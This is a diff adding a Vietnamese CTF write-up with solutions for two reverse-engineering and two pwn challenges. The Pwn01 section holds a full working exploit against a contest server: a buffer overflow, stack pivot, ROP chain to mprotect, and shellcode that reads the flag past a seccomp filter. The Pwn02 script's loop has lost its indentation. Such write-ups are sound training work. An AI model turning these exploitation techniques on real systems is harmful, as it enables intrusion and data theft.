@@ -336,3 +336,299 @@ Stack[00003D94]:0061FEBA db  69h ; i
 ```
 
 **Flag**: `ATTT{XachBaloLenVaDi}`
+
+
+# RE: Re2
+
+#### Challenge
+
+[babyRE](https://github.com/vinhxinh/SVATTT_PTIT_2023/raw/main/Re2/babyRE)
+
+#### Solution
+
+* Challenge này chỉ cho chúng ta một file ELF 64-bit. Mình có cho vào IDA để decompile file này và nhận thấy bên trong code khá là sợ.
+
+![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re2/pic1.png?raw=true)
+
+* Nhìn sơ qua thì có vẻ như file này được compile từ code một file code C++, nhưng không sử dụng một vài chức năng cho debug nên trông khá là rối
+* Do vậy nên mình tiến hành kiểm tra các phần code và cùng với đó sử dụng chatGPT để đẩy nhanh quá trình đọc code. Và về cơ bản thì hàm main thực hiện những chức năng như sau:
+
+``` 
+#include <iostream>
+#include <string>
+#include <algorithm>
+#include <cctype>
+
+int main() {
+    std::string cipher = "VJJLBTTXKDFQGQLGKV";
+    
+    // Get input from user
+    std::cout << "Enter key: ";
+    std::string input;
+    std::cin >> input;
+
+    // Convert input to uppercase
+    std::transform(input.begin(), input.end(), input.begin(), [](unsigned char c){ return std::toupper(c); });
+
+    // Pad input with "+" to make length a multiple of 3
+    int padding = (3 - input.length() % 3) % 3;
+    input += std::string(padding, '+');
+
+    // Encrypt input in blocks of 3 characters
+    std::string ciphertext;
+    for (int i = 0; i < input.length(); i += 3) {
+
+        // block_c =  3 elements from cipher starting at index i 
+        // block_i = 3 elements from input key starting at index i
+
+        encrypt(block_temp, block_i);
+
+        // If a1 != a2
+        if (cmp(block_c, block_temp))
+        {
+            // Fail []
+        }
+        else
+        {
+            // Correct []
+        }
+    }
+
+    if (number of Correct [] == 6)
+    {
+        // Print flag.
+    }
+    else
+    {
+        // Print invalid key.
+    }
+
+    return 0;
+}
+```
+
+* Nhìn vào đoạn code được đơn giản hóa chúng ta có thể thấy rằng:
+  
+  * Đầu tiên là phần input thì chương trình chỉ nhận ký tự in hoa.
+  * Phần mã hóa sẽ mã hóa và kiểm tra từng block 3 phần tử từ input mình nhập vào.
+* Thử tính toán nhanh với việc thử tất cả các trường hợp từng block 3 một, mình sẽ cần phải thử `26*26*26 = 17576` lần, mình cần thử với 6 blocks, nhưng do mỗi block độc lập với nhau, nên mình có thể chạy đồng thời 6 chương trình brute-force mỗi block đó. Như vậy là thời gian tìm được flag là có thể chấp nhận được. Máy xịn để làm gì cơ chứ
+* Mình sẽ sử dụng python và pwntools để thực hiện chạy và truyền đối số vào chương trình. Bên dưới là chi tiết về script của mình cho block đầu tiên.
+
+``` 
+#! /usr/bin/python3
+#  filename: exp.py
+
+from pwn import *
+
+table = string.ascii_uppercase
+
+for i in table:
+    for j in table:
+        for k in table:
+            elf = ELF("./babyRE")
+            p = elf.process()
+
+            feed = i+j+k
+
+            p.sendline(feed.encode())
+
+            s = p.recvall()
+
+            if ("Correct" in str(s)):
+                log.info("CORRECT WITH " + str(feed) + '\n')
+                exit()
+```
+
+* Với mỗi block tiếp theo, mình sẽ chỉ quan tâm tới phần block đó mà không cần quan tâm tới việc các block khác ra sao, vậy nên mình sẽ padding cho các phần block đó toàn ký tự  `'A'`
+* Ban đầu mình chỉ sử dụng script đầu tiên cho tất cả các block, mà không quan tâm tới việc có thể có nhiều hơn một chuỗi có thể cho kết quả Correct được nên mình đã tìm được một fake flag, sau đó mình đã sửa 3 script cuối, vì 3 blocks đầu ra kết quả mình nghĩ là chính xác rồi.
+* Toàn bộ script mình sẽ để trong đây [scripts](https://github.com/vstxckr/Pwnable-WriteUp/tree/main/Contests/PTIT%20Qualifier%20for%20SVATTT%202023/Reverse/RE2/scripts)
+* Tiếp theo mình sẽ tiến hành chạy tất cả các script và ngồi đợi kết quả.
+
+* Block 1
+![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re2/pic2.png?raw=true)
+
+* Block 2
+![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re2/pic3.png?raw=true)
+
+* Block 3
+![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re2/pic4.png?raw=true)
+
+* Block 4
+![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re2/pic5.png?raw=true)
+
+* Block 5
+![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re2/pic6.png?raw=true)
+
+* Block 6
+![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re2/pic7.png?raw=true)
+
+* Ở 3 blocks cuối, do có nhiều hơn một chuỗi đưa ra kết quả đúng cho đầu vào file thực thi nên sau một hồi xem xét mình đã ghép được thành một message đúng là: `BAINAYRATLADETOANG`
+* Input vào file babyRE ta nhận được thông báo flag chính xác:
+
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re2/pic8.png?raw=true)
+
+**Flag**: `ATTT{BAINAYRATLADETOANG}`
+
+
+# RE: Re1
+
+#### Challenge
+[xorxor.zip](https://github.com/vinhxinh/SVATTT_PTIT_2023/raw/main/Re1/xorxor.zip)
+
+#### Solution
+
+* Đề bài cho chúng ta 1 file .zip, sau khi giải nén được được file xorxor.exe
+
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re1/pic1.png?raw=true)
+ 
+* Load file vào `IDA` để xem source code
+ 
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re1/pic2.png?raw=true)
+ 
+* Chương trình khi chạy sẽ có giao diện để nhập flag và key
+
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re1/pic3.png?raw=true)
+ 
+* Sau khi tìm kiếm ta sẽ đến được hàm xử lí chính của chương trình, và sẽ đổi tên thành hàm encrypt
+
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re1/pic4.png?raw=true)
+ 
+* Hàm này sẽ nhận chuỗi flag và key để xor theo thuật toán rồi cuối cùng so sánh với chuỗi: **“0121317d1d5d0701636e355f4b237e”** nếu đúng thì sẽ hiện thông báo lên mà hình
+* Từ thuật toán và chuỗi đã encrypt, ta có thể viết script để decode ngược lại và lấy flag 
+
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Re1/pic5.png?raw=true)
+
+**Flag**: `ATTT{345y_m341}`
+	
+
+# Pwn: Pwn01
+
+#### Challenge
+
+[pwn01](https://github.com/vinhxinh/SVATTT_PTIT_2023/raw/main/Pwn01/pwn01)
+
+#### Solution
+
+* Chương trình gọi seccomp => có sandbox syscall check arch,`0x40000000`, và syscall number execute
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Pwn01/pic1.png?raw=true)
+
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Pwn01/pic2.png?raw=true)
+	
+* Overflow variable v6 => overwrite return instruction pointer
+ 
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Pwn01/pic3.png?raw=true)
+  
+  ![](https://github.com/vinhxinh/SVATTT_PTIT_2023/blob/main/Pwn01/pic4.png?raw=true)
+  
+* Lưu ý hàm **is_this_funny** so sánh 11 character đầu tiên của v6.
+
+* Variable v6: Do chỉ tràn `0x90` tức là chỉ ghi đè được thêm 4 stack sau RIP => thiếu space thực thi rop => dùng stack pivot fake rsp về biến name.
+* Variable name: Sau khi rsp jmup về đây thì thực thi tiếp instructions ở đây nên ta cần xác định thiết lập ROP trên biến này trước.
+* Ý tưởng là thiết lập segment rwx bằng mpprotect (do file compile static nên có sẵn nhiều gadget and function libc extern), khi đó thoải mái thiết lập shelcode thực thi việc đọc flag và in ra. (xử dụng openat and sendfile).
+
+**Payload**:
+```
+#!/usr/bin/env python3
+from pwn import *
+elf = ELF('./pwn01')
+context.arch = 'amd64'
+# p = elf.process()
+# context.log_level = 'DEBUG'
+# gdb.attach(p, '''
+# b *main+242
+# ''')
+p = remote('167.172.80.186', '6666')
+suprize = b'I\'m weebiii'
+pop_rdi = 0x00000000004033e1 # pop rdi ; ret
+pop_rsi = 0x00000000004021e4 # pop rsi ; ret
+pop_rdx = 0x0000000000450b6d # pop rdx ; ret
+name_addr = 0x4d7320
+leave_ret = 0x00000000004016d8 # leave ; ret
+mprotect_addr = 0x452e50
+rw_addr = 0x4d5000
+# 1
+shellcode = asm(
+f'''
+xor rdx, rdx
+xor r10d, r10d
+mov rsi, 0x4d7320
+xor rdi, rdi
+xor rax, rax
+add rax, 0x101
+
+syscall
+mov r10, 0xffff
+mov rsi, rax
+xor rdi, rdi
+add rdi, 0x1
+xor rax, rax
+add rax, 0x28
+syscall
+mov rax, 1
+mov rdi, 1
+syscall
+''')
+name = b''
+name += b'/flag\x00'
+name += b'ABCaaaa/home/pwn01'
+name += b'ABCDEFGH'
+name += p64(pop_rdi)
+name += p64(rw_addr)
+name += p64(pop_rsi)
+name += p64(0x3000)
+name += p64(pop_rdx)
+name += p64(7)
+name += p64(mprotect_addr)
+name += p64(name_addr + 0x60)
+name += shellcode
+p.sendlineafter(b'> ', name)
+# 2
+payload = b''
+payload += suprize
+payload += b'A' * (0x60-11)
+payload += p64(name_addr+0x18)
+payload += p64(leave_ret)
+p.sendlineafter(b'> ', payload)
+p.interactive()
+
+```
+
+**Flag**: ATTT{s3cur1tyy_@-@_t3h_ckUf}
+
+
+# Pwn: Pwn02
+
+#### Challenge
+
+> Time Wizard:
+nc 167.172.80.186 5555
+
+Hint: _Use timestamp_
+
+#### Solution
+
+* chương trình yêu cầu đoán số, tạo số sử dụng dấu thời gian => sử dụng lib python time và đoán số.
+
+```
+#!/usr/bin/env python3
+from pwn import *
+import random
+import time
+import calendar
+import datetime
+from ctypes import *
+import random
+while True:
+p = remote('167.172.80.186', '5555')
+current_GMT = time.gmtime()
+time_stamp = calendar.timegm(current_GMT)
+payload = b''
+payload += str(time_stamp).encode()
+print(payload)
+p.sendlineafter(b'generated',
+str(calendar.timegm(current_GMT)).encode())
+data = p.recvall()
+print(data)
+```
+
+**Flag**: `ATTT{Im4b4dboizwh0puShs33d1nU}`
